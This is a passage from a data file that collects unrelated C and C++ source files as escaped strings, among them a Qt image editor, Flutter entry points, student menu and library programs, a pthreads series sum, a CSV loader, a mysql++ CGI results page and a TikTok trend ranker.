\u0421\u0434\u0432\u0438\u043d\u0443\u0442\u044c \u0445\u043e\u043b\u0441\u0442\r\n{\r\n    if (canv!=nullptr){\r\n        bool canvasMoved=false;\r\n        if (e->key()==Qt::Key_W||e->key()==1062){canv->offsetY = canv->offsetY+10; canvasMoved=true;}\r\n        if (e->key()==Qt::Key_A||e->key()==1060){canv->offsetX = canv->offsetX+10; canvasMoved=true;}\r\n        if (e->key()==Qt::Key_S||e->key()==1067){canv->offsetY = canv->offsetY-10; canvasMoved=true;}\r\n        if (e->key()==Qt::Key_D||e->key()==1042){canv->offsetX = canv->offsetX-10; canvasMoved=true;}\r\n        if(canvasMoved)canv->repaint();\r\n    }\r\n}\r\n\r\nbool MainWindow::eventFilter(QObject *object, QEvent *event) // \u0414\u0432\u043e\u0439\u043d\u043e\u0435 \u043d\u0430\u0436\u0430\u0442\u0438\u0435 \u043d\u0430 \u0441\u043b\u0430\u0439\u0434\u0435\u0440\r\n{\r\n    if (canv!=nullptr){\r\n        bool sliderReset=false;\r\n        if (object == ui->SlidExp && event->type() == QEvent::MouseButtonDblClick){ui->SlidExp->setValue(100); sliderReset=true;}\r\n        if (object == ui->SlidHl && event->type() == QEvent::MouseButtonDblClick){ui->SlidHl->setValue(0); sliderReset=true;}\r\n        if (object == ui->SlidSh && event->type() == QEvent::MouseButtonDblClick){ui->SlidSh->setValue(0); sliderReset=true;}\r\n        if (object == ui->SlidTp && event->type() == QEvent::MouseButtonDblClick){ui->SlidTp->setValue(0); sliderReset=true;}\r\n        if (object == ui->SlidTi && event->type() == QEvent::MouseButtonDblClick){ui->SlidTi->setValue(100); sliderReset=true;}\r\n        if (object == ui->SlidBl && event->type() == QEvent::MouseButtonDblClick){ui->SlidBl->setValue(100); sliderReset=true;}\r\n        if(sliderReset)canv->repaint();\r\n    }\r\n    return false;\r\n}\r\n\r\nvoid MainWindow::on_pbSave_clicked() // \u0421\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u044c \u043a\u0430\u0440\u0442\u0438\u043d\u043a\u0443\r\n{\r\n    canv->saveImage(copyImage);\r\n}\r\n\r\nvoid MainWindow::initializeSlider(QSlider *slider, int min, int max, int val) // \u041d\u0430\u0441\u0442\u0440\u043e\u0438\u0442\u044c \u043d\u0430\u0447\u0430\u043b\u044c\u043d\u043e\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u0441\u043b\u0430\u0439\u0434\u0435\u0440\u0430\r\n{\r\n    slider->setMinimum(min);\r\n    slider->setMaximum(max);\r\n    slider->setValue(val);\r\n    slider->installEventFilter(this);\r\n}\r\n\r\nvoid MainWindow::initializeSliders() // \u0417\u0430\u0434\u0430\u0442\u044c \u043d\u0430\u0447\u0430\u043b\u044c\u043d\u043e\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u0434\u043b\u044f \u0432\u0441\u0435\u0445 \u0441\u043b\u0430\u0439\u0434\u0435\u0440\u043e\u0432\r\n{\r\n    initializeSlider(ui->SlidExp, 0, 500, 100);\r\n    initializeSlider(ui->SlidHl, -30, 125, 0);\r\n    initializeSlider(ui->SlidSh, -150, 150, 0);\r\n    initializeSlider(ui->SlidTp, 70, 130, 100);\r\n    initializeSlider(ui->SlidTi, 80, 120, 100);\r\n    initializeSlider(ui->SlidBl, 0, 10, 0);\r\n}\r\n\r\nvoid MainWindow::createCanvas() // \u0421\u043e\u0437\u0434\u0430\u0442\u044c \u0445\u043e\u043b\u0441\u0442\r\n{\r\n    canv = new canvas(&mainImage);\r\n    canv->setGeometry(100,100,1000,600);\r\n    canv->show();\r\n    canv->repaint();\r\n}\r\n\r\nvoid MainWindow::flickButtons(bool isImageOpened) // \u041f\u0435\u0440\u0435\u043a\u043b\u044e\u0447\u0438\u0442\u044c \u043a\u043d\u043e\u043f\u043a\u0438 \u0434\u043b\u044f \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u043a\u0430\u0440\u0442\u0438\u043d\u043a\u043e\u0439\r\n{\r\n    ui->pbOpen->setEnabled(!isImageOpened);\r\n    ui->pbSave->setEnabled(isImageOpened);\r\n    ui->pbZoomIn->setEnabled(isImageOpened);\r\n    ui->pbZoomOut->setEnabled(isImageOpened);\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"tp1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <stdio.h>\r\n\r\nint main() {\r\n    int choice, quantity, total = 0;\r\n    char moreOrders;\r\n\r\n    do {\r\n        // Display menu\r\n        printf(\"---------- Menu --------\\n\");\r\n        printf(\"1. Pizza       price = 180rs/pcs\\n\");\r\n        printf(\"2. Burger      price = 100rs/pcs\\n\");\r\n        printf(\"3. Dosa        price = 120rs/pcs\\n\");\r\n        printf(\"4. Idli        price =  50rs/pcs\\n\");\r\n        printf(\"Please enter your choice: \");\r\n        scanf(\"%d\", &choice);\r\n\r\n        // Switch case for handling the selected item\r\n        switch(choice) {\r\n            case 1:\r\n                printf(\"You have selected Pizza.\\n\");\r\n                printf(\"\\nEnter the quantity: \");\r\n                scanf(\"%d\", &quantity);\r\n                total += 180 * quantity;\r\n                printf(\"Amount: %d\\n\", 180 * quantity);\r\n                break;\r\n            case 2:\r\n                printf(\"You have selected Burger.\\n\");\r\n                printf(\"Enter the quantity: \");\r\n                scanf(\"%d\", &quantity);\r\n                total += 100 * quantity;\r\n                printf(\"Amount: %d\\n\", 100 * quantity);\r\n                break;\r\n            case 3:\r\n                printf(\"You have selected Dosa.\\n\");\r\n                printf(\"Enter the quantity: \");\r\n                scanf(\"%d\", &quantity);\r\n                total += 120 * quantity;\r\n                printf(\"Amount: %d\\n\", 120 * quantity);\r\n                break;\r\n            case 4:\r\n                printf(\"You have selected Idli.\\n\");\r\n                printf(\"Enter the quantity: \");\r\n                scanf(\"%d\", &quantity);\r\n                total += 50 * quantity;\r\n                printf(\"Amount: %d\\n\", 50 * quantity);\r\n                break;\r\n            default:\r\n                printf(\"Invalid choice! Please select a valid option.\\n\");\r\n        }\r\n\r\n        // Ask if user wants to order more\r\n        printf(\"Do you want to place more orders? (y/n): \");\r\n        scanf(\" %c\", &moreOrders);\r\n    } while (moreOrders == 'y' || moreOrders == 'Y');\r\n\r\n    // Display the total amount\r\n    printf(\"Total Amount is = %d\\n\", total);\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include <pthread.h>\n#include <iostream>\n#include <cmath>\n\nusing namespace std;\n\nstruct ThreadParameters {\n    int number; //n\n    double result; //resultado\n};\n\nvoid* Calc(void* args) { //subrutina para calcular el resultado\n    ThreadParameters* parameters = static_cast<ThreadParameters*>(args); //convierte de void* a ThreadParameters*\n    parameters->result = 3.0 / pow(2.0, parameters->number);\n    pthread_exit(nullptr);\n}\n\nint main() {\n    int NTHREADS; //n\u00famero de threads a usar, que es igual a la n ingresada por el usuario\n\n    cout << \"Ingresa el valor de n que desea calcular: \";\n    cin >> NTHREADS;\n\n    pthread_t* threads = new pthread_t[NTHREADS]; //array threads\n    ThreadParameters* threadParameters = new ThreadParameters[NTHREADS]; //array par\u00e1metros\n\n    for (int i = 0; i < NTHREADS; ++i) { //n\u00famero para el thread\n        threadParameters[i].number = i;\n        threadParameters[i].result = 0.0;\n        pthread_create(&threads[i], nullptr, Calc, &threadParameters[i]); //crear thread\n    }\n\n    double totalSum = 0.0;\n    for (int i = 0; i < NTHREADS; ++i) {\n        pthread_join(threads[i], nullptr); //unir threads\n        totalSum += threadParameters[i].result; //sumar resultado de cada thread\n    }\n\n    cout << \"La suma total de la serie es: \" << totalSum << endl;\n\n    delete[] threads; // liberar memoria\n    delete[] threadParameters; // liberar memoria\n\n    pthread_exit(nullptr);\n    return 0;\n}",
    "//DataSeeder.cpp\n\n#include \"DataSeeder.h\"\n#include <iostream>\n#include <fstream>\n#include <sstream>\n\nstd::vector<University> DataSeeder::universities;\n\nstd::vector<University>& DataSeeder::loadData() {\n    std::ifstream file(\"data.csv\");\n\n    if (!file.is_open()) {\n        std::cerr << \"Error opening file.\" << std::endl;\n        return universities;\n    }\n\n    universities.clear();\n\n    std::string line;\n    std::getline(file, line);  // Skip the header line\n\n    while (std::getline(file, line)) {\n        std::istringstream iss(line);\n        std::string token;\n        University university;\n\n        try {\n            std::getline(iss, token, ',');\n            university.rank = (token.empty() ? 0 : std::stoi(token));\n            std::getline(iss, university.name, ',');\n            std::getline(iss, university.locationCode, ',');\n            std::getline(iss, university.location, ',');\n\n            std::vector<double> scores;\n            std::vector<int> ranks;\n\n            for (int i = 0; i < 13; i++) {\n                std::getline(iss, token, ',');\n                if (token.empty() || token == \"-\" || token == \"NA\" || token == \"601+\") {\n                    scores.push_back(0.0);\n                    ranks.push_back(0);\n                }\n                else {\n                    scores.push_back(std::stod(token));\n                    std::getline(iss, token, ',');\n                    if (token.empty() || token == \"-\" || token == \"NA\" || token == \"601+\") {\n                        ranks.push_back(0);\n                    }\n                    else {\n                        ranks.push_back(std::stoi(token));\n                    }\n                }\n            }\n\n            university.arScore = scores[0];\n            university.arRank = ranks[0];\n            university.erScore = scores[1];\n            university.erRank = ranks[1];\n            university.fsrScore = scores[2];\n            university.fsrRank = ranks[2];\n            university.cpfScore = scores[3];\n            university.cpfRank = ranks[3];\n            university.ifrScore = scores[4];\n            university.ifrRank = ranks[4];\n            university.isrScore = scores[5];\n            university.isrRank = ranks[5];\n            university.irnScore = scores[6];\n            university.irnRank = ranks[6];\n            university.gerScore = scores[7];\n            university.gerRank = ranks[7];\n            university.scoreScaled = scores[8];\n        }\n        catch (const std::invalid_argument& e) {\n            //std::cerr << \"Error: Invalid data in line: \" << line << std::endl;\n            continue;\n        }\n        catch (const std::exception& e) {\n            //std::cerr << \"An exception occurred: \" << e.what() << '\\n';\n            continue;\n        }\n\n        universities.push_back(university);\n    }\n\n    file.close();\n\n    return universities;\n}\n\nstd::vector<University>& DataSeeder::getUniversities() {\n    return universities;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"questly\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"heatNode.h\"\n#include \"heatNode.cpp\"\n#include \"heatStack.h\"\n#include \"heatStack.cpp\"\n#include \"msgNode.h\"\n#include \"msgNode.cpp\"\n#include \"msgQueue.h\"\n#include \"msgQueue.cpp\"\n#include<iostream>\nusing namespace std;\n\nint main()\n{\n    cout<<\"\\nMSGNODEMSGNODEMSGNODEMSGNODEMSGNODEMSGNODEMSGNODEnMSGNODEMSGNODEMSGNODE\\n\";\n    \n    msgNode<string> *A = new msgNode<string>(\"Animal\",4);\n    msgNode<string> *B = new msgNode<string>(\"Bear\",5);\n    msgNode<string> *C = new msgNode<string>(\"Cat\",6);\n    msgNode<string> *D = new msgNode<string>(\"Dog\",7);\n    msgNode<string> *E = new msgNode<string>(\"Elephant\",8);\n    msgNode<string> *F = new msgNode<string>(\"Frog\",9);\n    \n    msgQueue<string> myQueue;\n    \n    cout<<\"\\n-----------------------------------------------------------------enqueue(t)\\n\";\n    myQueue.enqueue(A);\n    myQueue.enqueue(B);\n    myQueue.enqueue(C);\n    myQueue.enqueue(D);\n    myQueue.enqueue(E);\n    myQueue.print();\n    \n    cout<<\"\\n-----------------------------------------------------------------compileMessageData()\\n\";\n    myQueue.compileMessageData();\n    \n    cout<<\"\\n-----------------------------------------------------------------peek()\\n\";\n    msgNode<string> *G = myQueue.peek();\n    cout << G->getMessage()<<endl;\n    cout << G->getSize()<<endl;\n    \n    cout<<\"\\n-----------------------------------------------------------------dequeue()\\n\";\n    myQueue.dequeue();\n    myQueue.dequeue();\n    myQueue.dequeue();\n    myQueue.dequeue();\n    myQueue.dequeue();\n    myQueue.dequeue();\n    myQueue.dequeue();\n    myQueue.print();\n    \n    cout<<\"\\n-----------------------------------------------------------------compileMessageData()\\n\";\n    myQueue.compileMessageData();\n    \n    cout<<\"\\n-----------------------------------------------------------------\\n\";\n    cout<<\"\\nHEATNODEHEATNODEHEATNODEnHEATNODEHEATNODEHEATNODEHEATNODEHEATNODEHEATNODE\\n\";\n    \n    heatNode<double> *a = new heatNode<double>(2.5,2);\n    heatNode<double> *b = new heatNode<double>(3,29);\n    heatNode<double> *c = new heatNode<double>(3.5,5);\n    heatNode<double> *d = new heatNode<double>(4,4);\n    heatNode<double> *e = new heatNode<double>(4.5,245);\n    heatNode<double> *f = new heatNode<double>(5.5,1);\n    \n    heatStack<double> mystack;\n    \n    cout<<\"\\n-----------------------------------------------------------------push(t)\\n\";\n    mystack.push(a);\n    mystack.push(b);\n    mystack.push(c);\n    mystack.push(d);\n    mystack.push(e);\n    mystack.push(f);\n    \n    mystack.print();\n    \n    cout<<\"\\n-----------------------------------------------------------------validateCooling(t)\\n\";\n    int *heat = new int(6);\n    for(int i=0  ;  i<6  ;  i++)\n        heat[i] = i+1;\n    \n    if(mystack.validateCooling(heat, 6) == 0 )\n        cout<<\"false\\n\";\n    else\n        cout<<\"true\\n\";\n    \n    \n    cout<<\"\\n-----------------------------------------------------------------peek()\\n\";\n    heatNode<double> *g = mystack.peek();\n    cout << g->getCoolantLevel()<<endl;\n    cout << g->getPower()<<endl;\n    \n    \n    cout<<\"\\n-----------------------------------------------------------------pop()\\n\";\n    mystack.pop();\n    mystack.pop();\n    mystack.pop();\n    mystack.pop();\n    mystack.pop();\n    mystack.pop();\n    \n    mystack.pop();\n    mystack.pop();\n    \n    mystack.print();\n    \n    cout<<\"\\n-----------------------------------------------------------------end\\n\";\n    \n    return 0;\n}",
    "#include <mysql++/mysql++.h>\n#include <regex>\n#include <iostream>\n#include <stdio.h>\n\nint main()\n{\n    std::string str;\n    int pag;\n    std::cin >> str >> pag;\n    printf(\"Content-type: text/html\\n\\n\");\n    if(std::regex_match(str, std::regex(R\"([0-9]{7})\")))\n    {\n        mysqlpp::Connection conn(\"tfsys\");\n        mysqlpp::Query qry = conn.query(\"select from_unixtime(time), id, (select name from users where id = recs.id), (select class from users where id = recs.id), lpad(setid, 5, 0), (select name from sets where id = recs.setid), cast((result * 100 / (select full from sets where id = recs.setid)) as unsigned) from recs where id=\"+str+\" order by time desc offset \" + std::to_string(pag*50) + \" rows fetch first 50 rows only;\");\n        if(mysqlpp::StoreQueryResult res = qry.store())\n        {\n            std::cout << \"<table>\\n<thread><tr><th>\u65f6\u95f4</th><th>\u5b66\u5de5\u53f7</th><th>\u59d3\u540d</th><th>\u73ed\u7ea7</th><th>\u9898\u7ec4\u7f16\u53f7</th><th>\u9898\u7ec4\u540d\u79f0</th><th>\u5f97\u5206</th></tr></thread>\\n<tbody>\";\n            for(auto rw : res)\n            {\n                std::cout << \"<tr>\\n\";\n                for(auto cl : rw)\n                {\n                    std::cout << \"<td>\" << cl << \"</td>\\n\";\n                }\n                std::cout << \"</tr>\\n\";\n            }\n            std::cout << \"</table><br />\\n\";\n            if(pag > 0)\n            {\n                std::cout << \"<a onclick=\\\"prvpagid()\\\">[\u4e0a\u4e00\u9875]</a>\" << std::endl;\n            }\n            if(res.size() >= 50)\n            {\n                std::cout << \"<a onclick=\\\"nxtpagid()\\\">[\u4e0b\u4e00\u9875]</a>\" << std::endl;\n            }\n            printf(\"<br />\\n\");\n        }\n        else\n        {\n            std::cout << \"ERROR: \" << qry.error() << \"\u8bf7\u5411\u5f18\u6bc527\u738b\u601d\u9f50\u62a5\u544a\u6b64\u95ee\u9898\u3002\\n\";\n        }\n    }\n    else\n    {\n        printf(\"illegal.\\n\");\n    }\n    return 0;\n}",
    "#include <iostream>\r\n#include <string>\r\n#include <limits> \r\nusing namespace std;\r\n\r\nclass Book {\r\nprivate:\r\n    string title;\r\n    string author;\r\n    string isbn;\r\n    bool available=true;\r\n\r\npublic:\r\n    void setTitle(string newTitle) {\r\n        title = newTitle;\r\n    }\r\n\r\n    void setAuthor(string newAuthor) {\r\n        author = newAuthor;\r\n    }\r\n\r\n    void setISBN(string newISBN) {\r\n        isbn = newISBN;\r\n    }\r\n\r\n    void setAvailable(bool status) {\r\n        available = status;\r\n    }\r\n\r\n    string getTitle() {\r\n        return title;\r\n    }\r\n\r\n    string getAuthor() {\r\n        return author;\r\n    }\r\n\r\n    string getISBN() {\r\n        return isbn;\r\n    }\r\n\r\n    string getAvailable() {\r\n        return available ? \"Available\" : \"Checked Out\";\r\n    }\r\n\r\n    void borrowBook() {\r\n        if (available) {\r\n            setAvailable(false);\r\n            cout << \"Book successfully borrowed.\" << endl;\r\n        } else {\r\n            cout << \"Sorry, the book is already checked out.\" << endl;\r\n        }\r\n    }\r\n\r\n    void returnBook() {\r\n        if (!available) {\r\n            setAvailable(true);\r\n            cout << \"Book successfully returned.\" << endl;\r\n        } else {\r\n            cout << \"Error: The book is already available.\" << endl;\r\n        }\r\n    }\r\n};\r\n\r\nvoid removebook(Book arr[], int &size, int element) {\r\n    for (int i = element; i < size - 1; ++i) {\r\n        arr[i] = arr[i + 1];\r\n    }\r\n    --size;\r\n    cout << \"Book has been removed.\" << endl;\r\n};\r\n\r\nint main() {\r\n    const int MAX_CAPACITY = 100;\r\n    Book lib[MAX_CAPACITY];\r\n    int bookCount = 0;\r\n\r\n    cout << \"\\nWelcome to the library management system!\" << endl;\r\n\r\n    while (true) {\r\n        cout << \"\\nMenu:\" << endl;\r\n        cout << \"1. Add more book\" << endl;\r\n        cout << \"2. Show list of books\" << endl;\r\n        cout << \"3. Remove book\" << endl;\r\n        cout << \"4. Search for book\" << endl;\r\n        cout << \"5. Borrow book\" << endl;\r\n        cout << \"6. Return book\" << endl;\r\n        cout << \"7. Exit\" << endl;\r\n\r\n        int choice, element;\r\n        string tell,borrow,returnn;\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n        cin.ignore(numeric_limits<streamsize>::max(),'\\n');\r\n        if (choice == 1) {\r\n            if (bookCount < MAX_CAPACITY) {\r\n                string title, author, isbn;\r\n                cout << \"Enter the book's title: \";\r\n                getline(cin, title);\r\n                cout << \"Enter the book's author: \";\r\n                getline(cin, author);\r\n                cout << \"Enter the book's ISBN: \";\r\n                getline(cin, isbn);\r\n                lib[bookCount].setTitle(title);\r\n                lib[bookCount].setAuthor(author);\r\n                lib[bookCount].setISBN(isbn);\r\n                bookCount++;\r\n                cout << \"Book successfully added.\" << endl;\r\n            } else {\r\n                cout << \"Error: The library is full. Cannot add more books.\" << endl;\r\n            }\r\n\r\n        } else if(choice==2){\r\n            cout << \"Available books:\" << endl;\r\n            for (int i = 0; i < bookCount; i++) {\r\n                cout << \"S.No\" << i + 1 << \". \" << \"TITLE OF BOOK-\" << lib[i].getTitle() << \"  AUTHOR OF BOOK-\" << lib[i].getAuthor() << \" ISBN NUMBER-\" << lib[i].getISBN() << endl;\r\n            }\r\n        }else if (choice == 3) {\r\n            if (bookCount > 0) {\r\n                \r\n                cout << \"Choose the S.No you want to delete or remove: \";\r\n                cin >> element;\r\n                if (element >= 1 && element <= bookCount) {\r\n                    removebook(lib, bookCount, element - 1);\r\n                } else {\r\n                    cout << \"Invalid S.No. No book removed.\" << endl;\r\n                }\r\n            } else {\r\n                cout << \"No books available to remove.\" << endl;\r\n            }\r\n\r\n        } else if (choice == 4) {\r\n            cout<<\"If you want to find a book enter it's ISBN number: \"<<endl;\r\n            cin>>tell;\r\n            bool found=false;\r\n            for(int i=0; i<=bookCount;i++){\r\n                if(tell==lib[i].getISBN()){\r\n                    found = true;\r\n                    cout << \"Book found:\" << endl;\r\n                    cout << \"Title: \" << lib[i].getTitle() << endl;\r\n                    cout << \"Author: \" << lib[i].getAuthor() << endl;\r\n                    cout << \"ISBN: \" << lib[i].getISBN() << endl;\r\n                    cout << \"Availability: \" << lib[i].getAvailable() << endl;\r\n                    \r\n                    break;\r\n                }\r\n            }\r\n            if (!found) {\r\n                cout << \"Book not found in the library.\" << endl;\r\n            }\r\n        \r\n        }else if(choice==5){\r\n            cout<<\"Enter ISBN number to borrow book\"<<endl;\r\n            cin>>borrow;\r\n            bool found=false;\r\n            for(int i=0;i<=bookCount;i++){\r\n                if(borrow==lib[i].getISBN()){\r\n                    found = true;\r\n                    lib[i].borrowBook();   \r\n       ",
    "#include \"tiktok.h\"\r\n#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <sstream>\r\n#include <vector>\r\n#include <map>\r\n#include <unordered_map>\r\n#include <queue>\r\n#include <set>\r\n\r\nclass Hashtag { //hashtag object (string and number of tiktoks it appears in)\r\npublic: \r\n\tHashtag(std::string hash, int c, long unsigned int t) {\r\n\t\thashtag = hash; \r\n\t\tcount = c;\r\n\t\ttotal_count = t; \r\n\t}\r\n\t\r\n\tint getCount() {return count;}\r\n\tlong unsigned int getTotalCount() {return total_count;}\r\n\tstd::string getHashtag() {return hashtag;}\r\n\t\r\nprivate:\r\n\tstd::string hashtag;\r\n\tint count; \r\n\tlong unsigned int total_count; \r\n};\r\n\r\nclass Sound { //sound object (id, name, author, number of tiktoks)\r\npublic: \r\n\tSound(std::string id, std::string name, std::string author, long unsigned int t) {\r\n\t\tsound_id = id; \r\n\t\tsound_name = name; \r\n\t\tsound_author = author;  \r\n\t\ttotal_count = t; \r\n\t}\r\n\tlong unsigned int getTotalCount() {return total_count;}\r\n\tstd::string getID() {return sound_id;}\r\n\tstd::string getName() {return sound_name;}\r\n\tstd::string getAuthor() {return sound_author;}\r\n\t\r\nprivate:\r\n\tstd::string sound_id, sound_name, sound_author; \r\n\tlong unsigned int total_count; \r\n};\r\n\r\n\r\n\r\nstruct compareHashtags { //compare hashtags based on count\r\n\tbool operator()(Hashtag& h1, Hashtag& h2) {\r\n\t\tif (h1.getCount() == h2.getCount()) {\r\n\t\t\tif (h1.getTotalCount() == h2.getTotalCount()) {\r\n\t\t\t\treturn (h1.getHashtag() > h2.getHashtag()); \r\n\t\t\t}\r\n\t\t\treturn (h1.getTotalCount() < h2.getTotalCount()); \r\n\t\t}\r\n\t\treturn (h1.getCount() < h2.getCount()); \r\n\t}\r\n};\r\n\r\nstruct compareSounds { //compare sounds based on count\r\n\tbool operator()(Sound& s1, Sound& s2) {\r\n\t\tif (s1.getTotalCount() == s2.getTotalCount()) {\r\n\t\t\treturn (s1.getID() > s2.getID()); \r\n\t\t}\r\n\t\treturn (s1.getTotalCount() < s2.getTotalCount()); \r\n\t}\r\n};\r\n\r\nbool compareTiktoks(Tiktok& t1, Tiktok& t2) {//sort tiktoks in the vector map by view count\r\n\treturn (t1.getPlayCount() > t2.getPlayCount());\r\n}\r\n\r\nint main(int argc, char* argv[]) {\r\n\tif (argc != 4) {return 1; }\r\n\t//command arguments\r\n\tstd::string fileName = argv[1]; \r\n\tstd::string outputName = argv[2]; \r\n\tstd::string type = argv[3]; //hashtag or sound\r\n\t\r\n\tstd::ofstream out(outputName);\r\n\t\r\n\t//map <hashtag, vector of tiktoks>\r\n\tstd::map<std::string, std::vector<Tiktok>> hashtagMap; \r\n\t//map <songID, vector of tiktoks>\r\n\tstd::map<std::string, std::vector<Tiktok>> musicMap; \r\n\t\r\n    std::ifstream jsonFile(fileName); \r\n\tstd::string line; \r\n\twhile (std::getline(jsonFile, line)) {\r\n\t\tTiktok tiktok(line); \r\n\t\tif (type == \"hashtag\") { //hashtag case \r\n\t\t\tfor (std::string h: tiktok.getHashTags()) {\r\n\t\t\t\tstd::string hashtag = \"#\" + h; \r\n\t\t\t\thashtagMap[hashtag].push_back(tiktok);\r\n\t\t\t}\r\n\t\t}\r\n\t\tif (type == \"sound\") {\r\n\t\t\tstd::string music_id = tiktok.getMusicID(); \r\n\t\t\tmusicMap[music_id].push_back(tiktok); \r\n\t\t}\r\n\t}\r\n\t\r\n\t//priority queue for hashtags\r\n\tstd::priority_queue<Hashtag, std::vector<Hashtag>, compareHashtags> hq; \r\n\t\r\n\t//priority queue for sounds\r\n\tstd::priority_queue<Sound, std::vector<Sound>, compareSounds> sq; \r\n\t\r\n\tif (type == \"hashtag\") {\r\n\t\tstd::map<std::string, std::vector<Tiktok>>::iterator it; \r\n\t\tfor (it = hashtagMap.begin(); it != hashtagMap.end(); ++it) {\r\n\t\t\tstd::sort(it->second.begin(), it->second.end(), compareTiktoks); \r\n\t\t\tlong unsigned int total = 0;\r\n\t\t\tfor (Tiktok t: it->second) {\r\n\t\t\t\ttotal += t.getPlayCount(); \r\n\t\t\t} \r\n\t\t\tHashtag hashtag(it->first, it->second.size(), total); \r\n\t\t\thq.push(hashtag); \r\n\t\t}\r\n\t\t//print out trending hashtags\r\n\t\tint i = 0;\r\n\t\tout << \"trending hashtags:\\n\" << std::endl; \r\n\t\twhile (i != 10) {\r\n\t\t\tHashtag hash = hq.top(); \r\n\t\t\tstd::string h = hash.getHashtag(); \r\n\t\t\tout << \"========================\" << std::endl;\r\n\t\t\tout << h << std::endl; \r\n\t\t\tout << \"used \" << hash.getCount() << \" times\" << std::endl; \r\n\t\t\tout << hash.getTotalCount() << \" views\\n\" << std::endl; \r\n\t\t\tfor (long unsigned int j = 0; j < 3; j++) {\r\n\t\t\t\tif (j >= hashtagMap[h].size()) {break;}\r\n\t\t\t\tout << \"cover url: \" << hashtagMap[h][j].getCover() << std::endl; \r\n\t\t\t\tout << \"web video url: \" << hashtagMap[h][j].getWeb() << std::endl; \r\n\t\t\t}\r\n\t\t\t//use throw try catch exception to detect when we reach the end of the list\r\n\t\t\ttry {\r\n\t\t\t\tif (i == 9) {\r\n\t\t\t\t\tthrow std::string(\"end of list\"); \r\n\t\t\t\t}\r\n\t\t\t\tout << \"========================\" << std::endl; \r\n\t\t\t}\r\n\t\t\tcatch (std::string str) {\r\n\t\t\t\tout << \"========================\"; \r\n\t\t\t}\r\n\t\t\thq.pop();\r\n\t\t\ti++; \r\n\t\t}\r\n\t}\r\n\t\r\n\t\r\n\tif (type == \"sound\") {\r\n\t\tstd::map<std::string, std::vector<Tiktok>>::iterator it; \r\n\t\tfor (it = musicMap.begin(); it != musicMap.end(); ++it) {\r\n\t\t\tstd::sort(it->second.begin(), it->second.end(), compareTiktoks); \r\n\t\t\tlong unsigned int total = 0; \r\n\t\t\tfor (Tiktok t: it->second) {\r\n\t\t\t\ttotal += t.getPlayCount(); \r\n\t\t\t}\r\n\t\t\tSound sound(it->first, it->second[0].getMusicName(), it->second[0].getMusicAuthor(), total); \r\n\t\t\tsq.push(sound); \r\n\t\t}\r\n\t\t//print out trending sounds\r\n\t\tint i = 0;\r\n\t\tout << \"trending sounds:\\n\" << std::endl;  \r\n\t\twhile (i != 10) ",
